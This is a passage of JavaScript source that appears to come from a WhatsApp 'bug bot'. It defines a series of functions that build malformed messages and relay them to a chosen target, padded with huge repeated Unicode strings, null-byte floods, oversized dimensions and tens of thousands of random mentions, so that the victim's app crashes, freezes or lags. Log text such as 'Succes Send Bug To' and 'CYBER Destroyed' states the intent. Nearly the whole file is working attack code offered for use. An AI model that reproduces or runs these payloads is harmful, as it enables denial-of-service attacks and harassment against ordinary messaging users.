            externalAdReply: {
              title: "☀️",
              body: "🩸",
              mediaType: 1,
              renderLargerThumbnail: false,
              nativeFlowButtons: [
                {
                  name: "payment_info",
                  buttonParamsJson: crash
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: crash
                },
              ],
            },
            extendedTextMessage: {
            text: "ꦾ".repeat(20000) + "@1".repeat(20000),
            contextInfo: {
              stanzaId: target,
              participant: target,
              quotedMessage: {
                conversation:
                  "💦💦💦💦😖" +
                  "ꦾ࣯࣯".repeat(50000) +
                  "@1".repeat(20000),
              },
              disappearingMode: {
                initiator: "CHANGED_IN_CHAT",
                trigger: "CHAT_SETTING",
              },
            },
            inviteLinkGroupTypeV2: "DEFAULT",
          },
           participant: target, 
          }
        }
      }
    }
  }, {})
  await devtrust.relayMessage(target, msg.message, {
    messageId: msg.key.id
  });
  console.log(chalk.red(`Succes Send Bug To ${target}`));
}

async function BugGb1(target) {
    try {
        const message = {
            botInvokeMessage: {
                message: {
                    newsletterAdminInviteMessage: {
                        newsletterJid: `33333333333333333@newsletter`,
                        newsletterName: "hokage" + "ꦾ".repeat(120000),
                        jpegThumbnail: "https://files.catbox.moe/e17h49.jpg",
                        caption: "ꦽ".repeat(120000) + "@0".repeat(120000),
                        inviteExpiration: Date.now() + 1814400000, // 21 hari
                    },
                },
            },
            nativeFlowMessage: {
    messageParamsJson: "CYBER",
    buttons: [
        {
            name: "call_permission_request",
            buttonParamsJson: "{}",
        },
        {
            name: "galaxy_message",
            paramsJson: {
                "screen_2_OptIn_0": true,
                "screen_2_OptIn_1": true,
                "screen_1_Dropdown_0": "nullOnTop",
                "screen_1_DatePicker_1": "1028995200000",
                "screen_1_TextInput_2": "null@gmail.com",
                "screen_1_TextInput_3": "94643116",
                "screen_0_TextInput_0": "\u0000".repeat(500000),
                "screen_0_TextInput_1": "SecretDocu",
                "screen_0_Dropdown_2": "#926-Xnull",
                "screen_0_RadioButtonsGroup_3": "0_true",
                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
            },
        },
    ],
},
                     contextInfo: {
                mentionedJid: Array.from({ length: 10 }, () => "0@s.whatsapp.net"),
                groupMentions: [
                    {
                        groupJid: "0@s.whatsapp.net",
                        groupSubject: "XvoludUltra!",
                    },
                ],
            },
        };

        await devtrust.relayMessage(target, message, {
            userJid: target,
        });
    } catch (err) {
        console.error("Error sending newsletter:", err);
    }
}

async function BugGb12(target, ptcp = true) {
    try {
        const message = {
            botInvokeMessage: {
                message: {
                    newsletterAdminInviteMessage: {
                        newsletterJid: `999999999999999999@newsletter`,
                        newsletterName: "GAME CHANGER" + "ꦾ".repeat(120000),
                        jpegThumbnail: "https://files.catbox.moe/laws24.jpg",
                        caption: "ꦽ".repeat(120000) + "@9".repeat(120000),
                        inviteExpiration: Date.now() + 1814400000, // 21 hari
                    },
                },
            },
            nativeFlowMessage: {
    messageParamsJson: "minato!",
    buttons: [
        {
            name: "call_permission_request",
            buttonParamsJson: "{}",
        },
        {
            name: "galaxy_message",
            paramsJson: {
                "screen_2_OptIn_0": true,
                "screen_2_OptIn_1": true,
                "screen_1_Dropdown_0": "nullOnTop",
                "screen_1_DatePicker_1": "1028995200000",
                "screen_1_TextInput_2": "null@gmail.com",
                "screen_1_TextInput_3": "94643116",
                "screen_0_TextInput_0": "\u0018".repeat(50000),
                "screen_0_TextInput_1": "SecretDocu",
                "screen_0_Dropdown_2": "#926-Xnull",
                "screen_0_RadioButtonsGroup_3": "0_true",
                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
            },
        },
    ],
},
                     contextInfo: {
                mentionedJid: Array.from({ length: 10 }, () => "0@s.whatsapp.net"),
                groupMentions: [
                    {
                        groupJid: "0@s.whatsapp.net",
                        groupSubject: "XvoludUltra",
                    },
                ],
            },
        };

        await devtrust.relayMessage(target, message, {
            userJid: target,
        });
    } catch (err) {
        console.error("Error sending newsletter:", err);
    }
}

async function xgroupnulL(target) {
         await devtrust.relayMessage(
                  target,
                  {
                           viewOnceMessage: {
                                    message: {
                                             interactiveResponseMessage: {
                                                      body: {
                                                               text: " XvoludUltra",
                                                               format: "DEFAULT"
                                                      },
                                                      nativeFlowResponseMessage: {
                                                               name: "call_permission_request",
                                                               paramsJson: "\u0000".repeat(1000000),
                                                               version: 3
                                                      }
                                             },
                                             contextInfo: {
                                                      mentionedJid: [
                                                               ...Array.from(
                                                                        { length: 1950 },
                                                                        () => `1${Math.floor(Math.random() * 999999)}@s.whatsapp.net`
                                                               )
                                                      ]
                                             }
                                    }
                           }
                  },
                  {}
         );
}

async function DelayGroup(target) {
    const mentionedList = Array.from({ length: 1950 }, () => `1${Math.floor(Math.random() * 999999)}@s.whatsapp.net`);

  await devtrust.sendMessage(target, {
    text: "XvoludUltra",
    mentions: target,
    contextInfo: {
      mentionedJid: mentionedList,
      isGroupMention: true
    }
  });
}

async function Xblanknoclick(target) {
  const ButtonsPush = [
    {
      name: "single_select",
      buttonParamsJson: JSON.stringify({  
        title: "ꦽ".repeat(5000),
        sections: [
          {
            title: "\u0000",
            rows: [],
          },
        ],
      }),
    },
  ];
  
  for (let i = 0; i < 10; i++) {
    ButtonsPush.push(
      {
        name: "quick_reply",
        buttonParamsJson: JSON.stringify({
          display_text: "ꦽ".repeat(5000),
        })
      },
      {
        name: "mpm",
        buttonParamsJson: JSON.stringify({
          status: true
        })
      },
      {
        name: "cta_call",
        buttonParamsJson: JSON.stringify({
          status: true
        })
      },
    );
  }
  
  const msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "ោ៝".repeat(20000),
              locationMessage: {
                degreesLatitude: 0,
                degreesLongtitude: 0,
              },
              hasMediaAttachment: true,
            },
            body: {
              text: "Hay" +
                "ꦽ".repeat(25000) +
                "ោ៝".repeat(20000),
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
              buttons: ButtonsPush,
            },
            contextInfo: {
              participant: target,
              mentionedJid: [
                "131338822@s.whatsapp.net",
                ...Array.from(
                  { length: 1900 },
                  () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                ),
              ],
              remoteJid: "X",
              participant: target,
              stanzaId: "1234567890ABCDEF",
              quotedMessage: {
                paymentInviteMessage: {
                  serviceType: 3,
                  expiryTimestamp: Date.now() + 1814400000
                },
              },
            },
          },
        },
      },
    },
    {}
  );
  
  await devtrust.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid: target },
  });
}

async function XinsooInvisV1(target) {
  const msg1 = await generateWAMessageFromContent(
    target,
    {
      extendedTextMessage: {
        text: "\n".repeat(9000),
        contextInfo: {
          participant: target,
          mentionedJid: [
            "13527337@s.whastapp.net",
            ...Array.from(
              { length: 1900 },
              () => "2" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
            ),
          ],
        },
      },
    },
    {}
  );
  
  const msg2 = await generateWAMessageFromContent(
    target,
    {
      extendedTextMessage: {
        text: "\n".repeat(9000),
        contextInfo: {
          participant: target,
          mentionedJid: [
            "13527337@s.whastapp.net",
            ...Array.from(
              { length: 1900 },
              () => "2" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
            ),
          ],
        },
      },
    },
    {}
  );
  
  await devtrust.relayMessage(target, msg1.message, {
    messageId: msg1.key.id,
    participant: { jid: target },
  });
  await devtrust.sendMessage(target, {
    delete: msg1.key,
  });
 
  await devtrust.relayMessage(target, msg2.message, {
    messageId: msg2.key.id,
    participant: { jid: target },
  });
  await devtrust.sendMessage(target, {
    delete: msg2.key,
  });
}

async function LocaXotion(target) {
    await devtrust.relayMessage(
        target, {
            viewOnceMessage: {
                message: {
                    liveLocationMessage: {
                        degreesLatitude: 197-7728-82882,
                        degreesLongitude: -111-188839938,
                        caption: ' GROUP_MENTION ' + "ꦿꦸ".repeat(150000) + "@1".repeat(70000),
                        sequenceNumber: '0',
                        jpegThumbnail: '',
                        contextInfo: {
                            forwardingScore: 177,
                            isForwarded: true,
                            quotedMessage: {
                                documentMessage: {
                                    contactVcard: true
                                }
                            },
                            groupMentions: [{
                                groupJid: "1999@newsletter",
                                groupSubject: " Subject "
                            }]
                        }
                    }
                }
            }
        }, {
            participant: {
                jid: target
            }
        }
    );
}

async function forclose(target) {
  // Add rate limiting - CYBER't let this function be called too fast
  const now = Date.now();
  if (global.lastForclose && (now - global.lastForclose) < 5000) {
    console.log("⏱️ forclose called too soon, skipping");
    return;
  }
  global.lastForclose = now;
  
  // Add timeout to prevent hanging
  const timeoutPromise = new Promise((_, reject) => {
    setTimeout(() => reject(new Error("forclose timeout")), 10000);
  });
  
  try {
    // Check if target is valid
    if (!target || typeof target !== 'string') {
      console.error("❌ Invalid target for forclose");
      return;
    }
    
    // Check if messageKontol exists
    if (!messageKontol) {
      console.error("❌ messageKontol is not defined");
      return;
    }
    
    // Use Promise.race to add timeout
    await Promise.race([
      (async () => {
        const msg = generateWAMessageFromContent(target, {
          viewOnceMessage: {
            message: {
              extendedTextMessage: {
                text: "*CYBER Destroyed*",
                contextInfo: {
                  mentionedJid: [target, "5521992999999@s.whatsapp.net"],
                  forwardingScore: 999,
                  isForwarded: false,
                  stanzaId: "FTG-EE62BD88F22C",
                  participant: "5521992999999@s.whatsapp.net",
                  remoteJid: target,
                  quotedMessage: {
                    callLogMessage: {
                      isVideo: false,
                      callOutcome: "1",
                      durationSecs: "0",
                      callType: "REGULAR",
                      participants: [
                        {
                          jid: target,
                          callOutcome: "1"
                        }
                      ]
                    }
                  }
                }
              }
            }
          }
        }, {
          quoted: messageKontol 
        });

        await devtrust.relayMessage(target, msg.message, {
          messageId: msg.key.id
        });
        
        console.log(chalk.green(`✅ forclose completed for ${target}`));
      })(),
      timeoutPromise
    ]);

  } catch (err) {
    console.error("❌ forclose error:", err.message);
    // CYBER't crash, just log the error
  }
}

//Quotednya

    
async function CarouselVY4(devtrust, target) {
  const img = {
    url: "https://mmg.whatsapp.net/o1/v/t24/f2/m239/AQMDTeV5_VA-OBFSuqdqXYX0-53ZJQHkoQR944ZaGcoo_GA4-3_-FypseU9Bi7f5ORRn-BQYL8vbFpfXOmxRdLVz8FkzxTf3SyA11Biz3Q?ccb=9-4&oh=01_Q5Aa2QFfCY7O3IquSb0Fvub083w1zLcGVzWCk-P1hjnUMKeSxQ&oe=68DA0F65&_nc_sid=e6ed6c&mms3=true",
    mimetype: "image/jpeg",
    fileSha256: Buffer.from("i4ZgOwy4PHQmtxW+VgKPJ0LEE9i7XfAwJYk4DVKnjB4=", "base64"),
    fileLength: "62265",
    height: 1080,
    width: 1080,
    mediaKey: Buffer.from("qaiU0wrsmuE9outTy1QEV8TnPwlNAFS5kqmTLBXBugM=", "base64"),
    fileEncSha256: Buffer.from("Vw0MGUhP27kXt9W4LxnpzzYGrozU8pbzafHsxoegPq8=", "base64"),
    directPath: "/o1/v/t24/f2/m239/AQMDTeV5_VA-OBFSuqdqXYX0-53ZJQHkoQR944ZaGcoo_GA4-3_-FypseU9Bi7f5ORRn-BQYL8vbFpfXOmxRdLVz8FkzxTf3SyA11Biz3Q?ccb=9-4&oh=01_Q5Aa2QFfCY7O3IquSb0Fvub083w1zLcGVzWCk-P1hjnUMKeSxQ&oe=68DA0F65&_nc_sid=e6ed6c",
    mediaKeyTimestamp: "1756530813",
    jpegThumbnail: Buffer.from(
      "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAvAAEAAgMBAAAAAAAAAAAAAAAAAQMCBAUGAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAADzuFlZHovO7xOj1uUREwAX0yI6XNtOxw93RIABlmFk6+5OmVN9pzsLte4BLKwZYjr6GuJgAAAAJBaD/8QAJhAAAgIBAgQHAQAAAAAAAAAAAQIAAxEQEgQgITEFExQiMkFhQP/aAAgBAQABPwABSpJOvhZwk8RIPFvy2KEfAh0Bfy0RSf2ekqKZL+6ONrEcl777CdeFYDIznIjrUF3mN1J5AQIdKX2ODOId9gIPQ8qLuOI9TJieQMd4KF+2+pYu6tK8/GenGO8eoqQJ0x+6Y2EGWWl8QMQQYrpZ2QZljV4A2e4nqRLaUKDb0jhE7EltS+RqrFTkSx+HrSsrgkjrH4hmhOf4xABP/8QAGBEAAwEBAAAAAAAAAAAAAAAAAREwUQD/2gAIAQIBAT8AmjvI7X//xAAbEQAABwEAAAAAAAAAAAAAAAAAAQIREjBSIf/aAAgBAwEBPwCuSMCSMA2fln//2Q==",
      "base64"
    ),
    contextInfo: {},
    scansSidecar: "lPDK+lpgZstxxk05zbcPVMVPlj+Xbmqe2tE9SKk+rOSLSXfImdNthg==",
    scanLengths: [7808, 22667, 9636, 22154],
    midQualityFileSha256: "kCJoJE5LX9w/KxdIQQgGtkQjP5ogRE6HWkAHRkBWHWQ="
  };
  
  for (let i = 0; i < 5; i++) {
    const cards = [
      {
        header: {
          hasMediaAttachment: true,
          imageMessage: img,
          title: "\u2060".repeat(3000) + "You Hate Me? \n" + i
        },
        body: { text: "ꦾ".repeat(9999) },
        footer: { text: "Made by haters #1st" + i },
        nativeFlowMessage: {
          messageParamsJson: "",
          buttons: [
            {
              name: "single_select",
              buttonParamsJson: "\u0000".repeat(1000)
            },
            {
              name: "cta_copy",
              buttonParamsJson: "{\"copy_code\":\"62222222\",\"expiry\":1692375600000}"
            },
            {
              name: "cta_url",
              buttonParamsJson: "{\"display_text\":\"VIEW\",\"url\":\"https://example.com\"}"
            },
            {
              name: "galaxy_message",
              buttonParamsJson: "{\"icon\":\"REVIEW\",\"flow_cta\":\"\\u0000\",\"flow_message_version\":\"3\"}"
            },
            {
              name: "payment_info",
              buttonParamsJson: "{\"reference_id\":\"Flows\",\"amount\":50000,\"currency\":\"IDR\"}"
            },
            {
              name: "payment_method",
              buttonParamsJson: `{\"reference_id\":null,\"payment_method\":${"\u0010".repeat(
                0x2710
              )},\"payment_timestamp\":null,\"share_payment_status\":true}`
            },
            {
              name: "payment_method",
              buttonParamsJson:
                "{\"currency\":\"IDR\",\"total_amount\":{\"value\":1000000,\"offset\":100},\"reference_id\":\"7eppeli-Yuukey\",\"type\":\"physical-goods\",\"order\":{\"status\":\"canceled\",\"subtotal\":{\"value\":0,\"offset\":100},\"order_type\":\"PAYMENT_REQUEST\",\"items\":[{\"retailer_id\":\"custom-item-6bc19ce3-67a4-4280-ba13-ef8366014e9b\",\"name\":\"D | 7eppeli-Exploration\",\"amount\":{\"value\":1000000,\"offset\":100},\"quantity\":1000}]},\"additional_note\":\"D | 7eppeli-Exploration\",\"native_payment_methods\":[],\"share_payment_status\":true}"
            }
          ]
        }
      }
    ];

    const msg = generateWAMessageFromContent(
      target,
      {
        viewOnceMessage: {
          message: {
            messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
            interactiveMessage: {
              body: { text: "ꦾ".repeat(9999) },
              footer: { text: "4izxvelzExerc1st." },
              header: { hasMediaAttachment: true, imageMessage: img },
              carouselMessage: { cards }
            },
            contextInfo: {
              remoteJid: "30748291653858@lid",
              participant: "0@s.whatsapp.net",
              mentionedJid: ["0@s.whatsapp.net"],
              urlTrackingMap: {
                urlTrackingMapElements: [
                  {
                    originalUrl: "https://nekopoi.care",
                    unconsentedUsersUrl: "https://nekopoi.care",
                    consentedUsersUrl: "https://nekopoi.care",
                    cardIndex: 1
                  },
                  {
                    originalUrl: "https://nekopoi.care",
                    unconsentedUsersUrl: "https://nekopoi.care",
                    consentedUsersUrl: "https://nekopoi.care",
                    cardIndex: 2
                  }
                ]
              },
              quotedMessage: {
                paymentInviteMessage: {
                  serviceType: 3,
                  expiryTimestamp: Date.now() + 1814400000
                }
              }
            }
          }
        }
      },
      {}
    );

    await devtrust.relayMessage(target, msg.message, { messageId: msg.key.id });
    await new Promise(res => setTimeout(res, 500));
  }

  const msg2 = {
    extendedTextMessage: {
      text: "Infinite Here!!¿\n" + "𑇂𑆵𑆴𑆿".repeat(60000),
      contextInfo: {
        fromMe: false,
        stanzaId: target,
        participant: target,
        quotedMessage: {
          conversation: "4izxvelzExec1st" + "𑇂𑆵𑆴𑆿".repeat(900)
        },
        disappearingMode: {
          initiator: "CHANGED_IN_CHAT",
          trigger: "CHAT_SETTING"
        }
      },
      inviteLinkGroupTypeV2: "DEFAULT"
    }
  };

  await devtrust.relayMessage(
    target,
    msg2,
    { ephemeralExpiration: 5, timeStamp: Date.now() },
    { messageId: null }
  );

  const msg3 = await generateWAMessageFromContent(
    target,
    {
      extendedTextMessage: {
        text: "Infinite Ai¿",
        matchedText: "https://wa.me/13135550002?s=5",
        description: "҉҈⃝⃞⃟⃠⃤꙰꙲" + "𑇂𑆵𑆴𑆿".repeat(15000),
        title: "xFlows Attack" + "𑇂𑆵𑆴𑆿".repeat(15000),
        previewType: "NONE",
        jpegThumbnail: null,
        inviteLinkGroupTypeV2: "DEFAULT"
      }
    },
    { ephemeralExpiration: 5, timeStamp: Date.now() }
  );

  await devtrust.relayMessage(target, msg3.message, { messageId: msg3.key.id });
}

async function xatanicinvisv4(jid) {
    const delay = Array.from({ length: 30000 }, (_, r) => ({
        title: "᭡꧈".repeat(95000),
        rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
    }));

    const MSG = {
        viewOnceMessage: {
            message: {
                listResponseMessage: {
                    title: "assalamualaikum",
                    listType: 2,
                    buttonText: null,
                    sections: delay,
                    singleSelectReply: { selectedRowId: "🔴" },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 30000 }, () => 
                            "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                        ),
                        participant: jid,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: "333333333333@newsletter",
                            serverMessageId: 1,
                            newsletterName: "-"
                        }
                    },
                    description: "*CYBERt Bothering Me Bro!!*"
                }
            }
        },
        contextInfo: {
            channelMessage: true,
            statusAttributionType: 2
        }
    };

    const msg = generateWAMessageFromContent(jid, MSG, {});

    await devtrust.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [jid],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: jid },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    // **Cek apakah mention true sebelum menjalankan relayMessage**
    if (jid) {
        await devtrust.relayMessage(
            jid,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_jid: "soker tai" },
                        content: undefined
                    }
                ]
            }
        );
    }
}

//===================================
async function protoXimg(isTarget, mention) {
    const msg = generateWAMessageFromContent(isTarget, {
        viewOnceMessage: {
            message: {
                imageMessage: {
                    url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m239/AQPhVUy-GB8j4eMwShipMnnTvurfJ-2lkIwl_Ya7rekL5bEjm0tAUbVWDFWIa70k7ppNkK_sKaiC25pIktUWgZrpPPd2gqBYZQfXkOY6Yw?ccb=9-4&oh=01_Q5Aa1QGHR_S8_fwvzLDqk9tWHgKIrZpbVKM_MgGLjZ6qa6m7mg&oe=6840325D&_nc_sid=e6ed6c&mms3=true",
    mimetype: "image/jpeg",
    caption: "🧊 공격 KIM BAYU JIHON",
    fileSha256: "aA1/vATnQcXlUBaQ1oAyXOC6I6ZRVDSuHaYDMpNcGbU=",
    fileLength: "999999",
    height: 999999,
    width: 999999,
    mediaKey: "b9k58Kc4h6DdwrOWefVdr/aLwHzoxxSWrFQ8Pk2uCXk=",
    "fileEncSha256": "odx9UpoytXfE7ze2CgIPrJa0K4cCEN/DxFfjt/wKimM=",
    directPath: "/o1/v/t62.7118-24/f2/m239/AQPhVUy-GB8j4eMwShipMnnTvurfJ-2lkIwl_Ya7rekL5bEjm0tAUbVWDFWIa70k7ppNkK_sKaiC25pIktUWgZrpPPd2gqBYZQfXkOY6Yw?ccb=9-4&oh=01_Q5Aa1QGHR_S8_fwvzLDqk9tWHgKIrZpbVKM_MgGLjZ6qa6m7mg&oe=6840325D&_nc_sid=e6ed6c",
    mediaKeyTimestamp: "1746342199",
    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAvAAACAwEBAAAAAAAAAAAAAAAABAIDBQEGAQEBAQEAAAAAAAAAAAAAAAABAgAD/9oADAMBAAIQAxAAAADzxPj1na/bTkx0+uyOOpRoFho5MYb0pSXqr+8R2axtzHNSTAjbCZx2Voxvu3yxLLOQ0vPKsvCabknsXq602sq3Q41nR1MyeaxQB1wG35A1X0NhUMIAEf/EACMQAAIDAAIBBQEBAQAAAAAAAAECAAMREiEEEyIxQVFCFCP/2gAIAQEAAT8AA0ExQpHZi1fncHj4p3YaJ/mOaJxQf1GCMd2MoH3BmExACx4yipEUct0zimYNgrTT2eoBhzvJ5NCJjza/oGFRvX5ANDShDzEFbYNycSD8CGsjfaIq8l7XDL02sjBOXZHAR90QOiKfvZ4rKbAxjMioNJge1Ty64z1QQezKvJtNpBhIZeQPUuL8/aNBjqdBP5ErHHSZRXlkUCxO83JTU5c62icCLMCwVYxbAJbqowzqZZucpYGCnWlTD8JwT1MckA9j4lNuggqVlHkIjsr/ABsNlfzz6jWB7gFY5LLtfhpMsZUcMNjOnpguvZ+BK34gZmxH/wCjSwsoU/cI5b7eyYq7HKqF4r8SpGbmQPd8iMSM5CXOGXqKCfueEhN30ROD2nXwjTmQJWiEkDZ7QTnDRH3sCsdQcsA4Yf5Innhw+ExlcDdiaehKGNbg5o+xPVxgaxgjX2vy6E52nfaIHt9x/Rk9U/0SJ5LCxuWR26wz/8QAGxEAAgIDAQAAAAAAAAAAAAAAAAEQERIgITD/2gAIAQIBAT8AEikPmjGVFw3NmXh//8QAIhEBAAEDAwQDAAAAAAAAAAAAAQACESEQEjEDMkFRQpGh/9oACAEDAQE/ACnt4lj1Np6mLfGVFmbS1OS5CMyeX6vK8VOg/sY1I4Yq8uhVHqLrSQCWJYjP/9k=",
    scansSidecar: "kGPbOzyrXkA+tcRTlOjwO2d16WRC5j+U3wM0aULEpvWziWDL4AuVmQ==",
    scanLengths: [ 7566, 58200, 24715, 32660],
                    contextInfo: {
                        isSampled: true,
                        mentionedJid: [
                            "13135550002@s.whatsapp.net",
                            ...Array.from({ length: 40000 }, () =>
                                `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
                            )
                        ]
                    },
                    streamingSidecar: "Fh3fzFLSobDOhnA6/R+62Q7R61XW72d+CQPX1jc4el0GklIKqoSqvGinYKAx0vhTKIA=",
                    thumbnailDirectPath: "/v/t62.36147-24/31828404_9729188183806454_2944875378583507480_n.enc?ccb=11-4&oh=01_Q5AaIZXRM0jVdaUZ1vpUdskg33zTcmyFiZyv3SQyuBw6IViG&oe=6816E74F&_nc_sid=5e03e0",
                    thumbnailSha256: "vJbC8aUiMj3RMRp8xENdlFQmr4ZpWRCFzQL2sakv/Y4=",
                    thumbnailEncSha256: "dSb65pjoEvqjByMyU9d2SfeB+czRLnwOCJ1svr5tigE=",
                    annotations: [
                        {
                            embeddedContent: {
                                embeddedMusic: {
                                    musicContentMediaId: "kontol",
                                    songId: "peler",
                                    author: "ᥬ🧊공식 ᥬNOCTURX 잘생긴" + "貍賳貎貏俳貍賳貎".repeat(100),
                                    title: "Yorxputz",
                                    artworkDirectPath: "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0",
                                    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                                    artworkEncSha256: "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
                                    artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
                                    countryBlocklist: true,
                                    isExplicit: true,
                                    artworkMediaKey: "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ="
                                }
                            },
                            embeddedAction: null
                        }
                    ]
                }
            }
        }
    }, {});

    await devtrust.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [isTarget],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [{ tag: "to", attrs: { jid: isTarget }, content: undefined }]
                    }
                ]
            }
        ]
    });

if (mention) {
        await devtrust.relayMessage(isTarget, {
            groupStatusMentionMessage: {
                message: { protocolMessage: { key: msg.key, type: 25 } }
            }
        }, {
            additionalNodes: [{ tag: "meta", attrs: { is_status_mention: "true" }, content: undefined }]
        });
    }
}
//=================================
async function protoXvid(isTarget, mention) {
const mentionedList = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 40000 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];

    const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: "🧊 공격 KIM BAYU JIHON" + "ោ៝".repeat(10000),
        title: "⇞ᥬ🧊공식 ᥬBAYU 잘생긴 ⇟",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

    const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
        fileLength: "999999",
        seconds: 999999,
        mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
        caption: "🧊 공격 *CYBER XMD*",
        height: 999999,
        width: 999999,
        fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
        directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1743848703",
        contextInfo: {
            isSampled: true,
            mentionedJid: mentionedList
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363420088299543@newsletter",
            serverMessageId: 1,
            newsletterName: "⇞ᥬ🧊공식 ᥬBAYU 잘생긴 ⇟"
        },
        streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
        thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
        thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
        thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
        annotations: [
            {
                embeddedContent: {
                    embeddedMusic
                },
                embeddedAction: true
            }
        ]
    };

    const msg = generateWAMessageFromContent(isTarget, {
        viewOnceMessage: {
            message: { videoMessage }
        }
    }, {});

    await devtrust.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [isTarget],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            { tag: "to", attrs: { jid: isTarget }, content: undefined }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await devtrust.relayMessage(isTarget, {
            groupStatusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { is_status_mention: "true" },
                    content: undefined
                }
            ]
        });
    }
}
//=================================
// 𝗕𝗨𝗟𝗗𝗢𝗭𝗘𝗥 𝗦𝗜 𝗣𝗘𝗡𝗬𝗘𝗗𝗢𝗧 𝗞𝗨𝗢𝗧𝗔
//================================
